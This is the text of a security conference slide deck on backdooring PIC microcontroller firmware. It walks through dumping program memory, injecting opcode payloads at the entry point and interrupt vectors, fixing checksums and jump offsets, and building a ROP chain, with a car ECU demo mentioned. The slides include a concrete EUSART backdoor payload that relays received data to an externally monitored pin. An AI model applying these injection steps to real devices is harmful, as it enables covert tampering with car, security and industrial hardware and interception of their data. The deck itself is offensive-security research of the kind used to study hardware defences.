Backdooring hardware devices by injecting malicious payloads on microcontrollers_
By Sheila A. Berta (@UnaPibaGeek)

WHO AM I?_
Sheila A. Berta (@UnaPibaGeek)
Offensive Security Researcher
A little bit more: - Developer in ASM (Microcontrollers & Microprocessors x86/x64), C/C++, Python and Go. - Speaker at Black Hat (x2), DEF CON (x2), Ekoparty (x4), HITB, PhDays, IEEE... & more.
@UnaPibaGeek

@UnaPibaGeek

MICROCONTROLLERS VS MICROPROCESSORS_

Microprocessors Intel, AMD, ARM
...
@UnaPibaGeek

Microcontrollers Microchip, ATMEL, ST
...

MICROPROCESSORS OVERVIEW_
· Microprocessors = CPU · Memories and I/O busses are physically separated. · Usually bigger than a microcontroller. · Greater processing capacity.
· Modified-Harvard memory organization. · 32 or 64 bits (most common).
@UnaPibaGeek

MICROCONTROLLERS OVERVIEW_
· Microcontrollers = CPU + RAM + ROM + I/O busses · Smaller CPU with less processing capacity. · Usually smaller size than microprocessors.
· Harvard memory organization. · 16 bits (most common). · A little stack.
@UnaPibaGeek

USE CASES_

Raspberry PI ARM Microprocessor
@UnaPibaGeek

!=
Arduino UNO Atmega Microcontroller

MICROCONTROLLERS EVOLUTION_
@UnaPibaGeek

IS WORTH IT?_
· Physical Security Systems. · Car's ECU. · Semaphores. · Elevators. · Sensors. · Modules of Industrial systems. · Home appliances. · Robots. ·...
@UnaPibaGeek

MICROCONTROLLERS PROGRAMMING_
@UnaPibaGeek

MICROCONTROLLERS PROGRAMMING_
@UnaPibaGeek

MICROCONTROLLERS PROGRAMMING_

ASM code to turning on a LED - (PIC)

MPLAB X IDE

@UnaPibaGeek

.hex file (firmware)

MICROCONTROLLERS PROGRAMMING_

Microchip (PIC) programmer software
@UnaPibaGeek

Microchip (PIC) programmer hardware

PROGRAM MEMORY DUMP_
@UnaPibaGeek

PIC MEMORY ORGANIZATION_

non-volatile
@UnaPibaGeek

volatile

non-volatile

PROGRAM MEMORY DUMP (STEP 1)_

@UnaPibaGeek

Connection from PIC microcontroller to PICKIT 3

PROGRAM MEMORY DUMP (STEP 2)_

1

3

2

4

@UnaPibaGeek

Using MPLAB X IDE to read (and dump) the program memory

PROGRAM MEMORY DUMP (STEP 3)_

@UnaPibaGeek

Load the .hex file in the MPLAB X IDE

CODE VS DISASSEMBLY (EXAMPLE)_

ASM source code

Disassembly

@UnaPibaGeek

OpCodes in the .hex dump

PAYLOAD INJECTION: AT THE ENTRY POINT_
@UnaPibaGeek

PROGRAM STANDARD STRUCTURE (PIC)_

@UnaPibaGeek

Reset Vector: always at 0x0000 memory address Interrupt Vector: at 0x0008 and 0x0018 memory addresses
Program entry point

LOCATING THE ENTRY POINT_

Entry point
Simple program example

Example 1 -- Entry point: 0x06 Example 2 -- Entry point: 0x7F84
@UnaPibaGeek

Large program example
Memory address to inject Memory address to inject

GENERATING THE PAYLOAD #1 (PoC)_

BCF TRISD,1 BSF PORTD,1 BCF TRISD,2 BSF PORTD,2

// Set PIN as output // Turn ON a LED // Set PIN as output // Turn ON a LED

0x9295 = BCF TRISD,1 0x8283 = BSF PORTD,1

0x9495 = BCF TRISD,2 0x8483 = BSF PORTD,2

Little Endian: 0x9592 0x8382 0x9594 0x8384
@UnaPibaGeek

INJECTING THE PAYLOAD_

Entry point offset

Entry point at 0x28

Original program memory (.hex dump)

Checksum

@UnaPibaGeek

Payload injected at entry point (0x28)

CHECKSUM RECALCULATION_
Sum(bytes on the line) = Not +1 = checksum
Example: :1000000003EF00F00000959E838E836A000E956E 10+00+00+00+03+EF+00+F0+00+00+95+9E+83+8E+83+6A+00+0E+95+6E = 0x634
Not(0x634) +1 = 0xFFFF 0xFFFF 0xFFFF 0xF9CC
Checksum = 0xCC
@UnaPibaGeek

CHECKSUM RECALCULATION_
https://www.fischl.de/hex_checksum_calculator/

@UnaPibaGeek

Payload injected and checksum fixed

WRITE THE PROGRAM MEMORY_
@UnaPibaGeek

BEFORE / AFTER (PoC)_

@UnaPibaGeek

Original

Payload injected

INJECTING TO A CAR'S ECU_

Entry point: 0x152A

@UnaPibaGeek

IGNITION KEY

DEMO TIME!

ADVANCED PAYLOAD INJECTION: AT THE INTERRUPT VECTOR_
@UnaPibaGeek

PERIPHERALS AND INTERRUPTIONS_
· Internal timers · A/D converters · CCP (Capture/Compare/PWM) · TX/RX busses · Others
@UnaPibaGeek

GIE AND PEIE BITS_

BSF INTCON, GIE BSF INTCON, PEIE

// Set GIE to 1 // Set PEIE to 1

@UnaPibaGeek

Interruptions enabled

INTERRUPTION FLAGS_

Timer0 Interruption Enabled

Timer0 Interruption Flag

XXIE = Interruption Enabled XXIF = Interruption Flag
Registers PIE1, PIE2 and PIE3 have interruption enabling bits Registers PIR1, PIR2 and PIR3 have interruption flags bits

@UnaPibaGeek

POLLING INSPECTION_
@UnaPibaGeek

Interrupt vector Polling

POLLING INSPECTION_
PIR1, 5
Call to RC interruption routine

@UnaPibaGeek

PIR1, 5 = PIR1, RCIF

MEMORY ADDRESSES TO INJECT A PAYLOAD_

@UnaPibaGeek

0x48 to inject a payload at the RC interruption 0x4E to inject a payload at Timer0 interruption 0x56 to inject a payload at the AD interruption 0x5E to inject a payload at the INT0 interruption

BACKDOORING THE EUSART COMMUNICATION PERIPHERAL_
Step 1: locate where the RC interruption routine begins (by inspecting the polling)

Call to RC interruption routine

0x48 RC interruption routine begins

@UnaPibaGeek

BACKDOORING THE EUSART COMMUNICATION PERIPHERAL_

Step 2: Cook a payload that makes a relaying of the received data to a TX peripheral which we are able to monitor externally (example)

MOVF BSF BCF BSF MOVWF

RCREG, W TXSTA, TXEN TXSTA, SYNC RCSTA, SPEN TXREG

// Move the received data to "W" register // Enable transmission // Set asynchronous operation // Set TX/CK pin as an output // Move received data (in W) to TXREG to be re-transmitted

@UnaPibaGeek

0xAE50 0xAC8A 0xAC98 0xAB8E 0xAD6E

BACKDOORING THE EUSART COMMUNICATION PERIPHERAL_
Step 3: lnject the payload where the RC interruption routine begins
0x48 RC interruption routine begins
Backdoor

@UnaPibaGeek

DEMO TIME!

FIXING JUMPS: FLOW CORRUPTION_

Original program @UnaPibaGeek

Program after payload injection

FIXING JUMPS: GOTO AND CALL OPCODES_

GOTO opcode = 0xEF

CALL opcode = 0xEC

NOP opcode = 0xF0

EF06 F000 = GOTO jumping to 0x0006 offset (0x000C memory address). EC67 F004 = CALL jumping to 0x0467 offset (0x08CE memory address).

Jump to 0x8CE (memory address) / 2 = 0x0467 offset
@UnaPibaGeek

FIXING JUMPS: RECALCULATION_

Payload injected at memory address: 0x48 Payload length: 10 bytes

Example:

CALL 0x56 (EC2B F000)

Original jump

CALL 0x60 (EC30 F000)

Fixed jump

Original offset + payload length

Three CALL fixed after injection

@UnaPibaGeek

AUTOMATING PAYLOAD INJECTION_

@UnaPibaGeek

https://github.com/UnaPibaGeek/UCPI

STACK PAYLOAD INJECTION: CONTROLLING PROGRAM FLOW_
@UnaPibaGeek

STKPTR, TOSU, TOSH AND TOSL_
STKPTR = Stack Pointer register TOSU, TOSH and TOSL = Top of Stack registers
@UnaPibaGeek

PROGRAM FLOW CONTROL_

INCF STKPTR,F
MOVLW 0x00 MOVWF TOSU
MOVLW 0x0C MOVWF TOSH
MOVLW 0x72 MOVWF TOSL
RETURN

// SP increment // TOSU = 0x00 // TOSH = 0x0C // TOSL = 0x72

Jump to 0x000C72

Jump to 0x000024

@UnaPibaGeek

SP Increment TOS = 0x000024

ROP-CHAIN_

ROP gadgets:

0x0060 = 0xFC2A000EFF6E000EFE6E600EFD6E 0x0058 = 0xFC2A000EFF6E000EFE6E580EFD6E 0x0050 = 0xFC2A000EFF6E000EFE6E500EFD6E 0x0048 = 0xFC2A000EFF6E000EFE6E480EFD6E 0x0040 = 0xFC2A000EFF6E000EFE6E400EFD6E 0x0038 = 0xFC2A000EFF6E000EFE6E380EFD6E 0x0030 = 0xFC2A000EFF6E000EFE6E300EFD6E 0x0028 = 0xFC2A000EFF6E000EFE6E280EFD6E

(last) (first)

RET = 0x1200

@UnaPibaGeek

Gadget example at 0x0040:
RETURN or RETLW
DEMO TIME!

PROGRAM MEMORY PROTECTIONS_
@UnaPibaGeek

CODE PROTECTION_
Microchip Config Directives
Program memory dump still works
@UnaPibaGeek

BOOT AND DATA PROTECTION_
Microchip Config Directives
Program memory dump doesn't work
@UnaPibaGeek

CONCLUSIONS_
@UnaPibaGeek

SPECIAL THANKS_
Sol (@encodedwitch) Nico Waisman (@nicowaisman) Dreamlab Technologies
@UnaPibaGeek

THANK YOU_
SHEILA A. BERTA (@UNAPIBAGEEK)

